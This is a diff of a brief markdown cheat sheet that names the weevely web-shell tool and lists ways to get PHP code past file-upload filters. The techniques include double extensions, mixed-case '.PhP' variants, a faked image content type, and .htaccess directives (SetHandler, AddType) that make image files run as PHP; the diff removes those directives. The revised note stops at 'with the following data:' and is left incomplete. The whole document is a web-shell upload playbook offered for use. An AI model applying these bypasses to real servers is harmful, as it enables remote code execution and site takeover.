@@ -1,34 +1,38 @@
-##Tool : weevely  -- Yes, thats all you need
-[Github Weevely](https://github.com/epinna/weevely3)
+## Tool: weevely
+
+[Weevely on GitHub](https://github.com/epinna/weevely3)
+
+### File Upload Techniques:
+
+- **upload.php**
+  - Try to upload a simple PHP file.
+
+- **upload.php.jpeg**
+  - To bypass the blacklist.
+
+- **upload.jpg.php**
+  - To bypass the blacklist.
+
+- **upload.php**
+  - And then change the content type of the file to image or JPEG.
+
+- **upload.php\***
+  - Version - 1, 2, 3, 4, 5, 6, 7.
+
+- **upload.PHP**
+  - To bypass the blacklist.
+
+- **upload.PhP**
+  - To bypass the blacklist.
+
+- **upload.pHp**
+  - To bypass the blacklist.
+
+- **upload .htaccess**
+  - By uploading this [jpg, png] files can be executed as PHP with malicious code within it.
+
+### Note:
+
+If you are not able to execute the `.PHP` file, upload a new `.htaccess` file in the same directory with the following data:
 
 
-##
-
-upload.php			---	try to upload a simple php file
-upload.php.jpeg 		--- 	To bypass the blacklist.
-upload.jpg.php 			---	To bypass the blacklist. 
-upload.php 			---	and Then Change the content type of the file to image or jpeg.
-upload.php*			---	version - 1 2 3 4 5 6 7 
-upload.PHP			---	To bypass The BlackList
-upload.PhP			---	To bypass The BlackList
-upload.pHp			---	To bypass The BlackList
-upload .htaccess 		--- 	By uploading this [jpg,png] files can be executed as php with milicious code within it.
-
-
-NOTE:	If you are not able to execute the .PHP file upload new .htaccess file in the
-	same directory with data "AddType appilication/x-httpd-php PHP"
-
-
-setHandler Method [.htaccess]
-------------------------------
-
-<FilesMatch "_php.gif">
-SetHandler application/x-httpd-php
-</FilesMatch>
-
-
-
-AddType Method [.htaccess]
---------------------------
-
-AddType application/x-httpd-php .lol
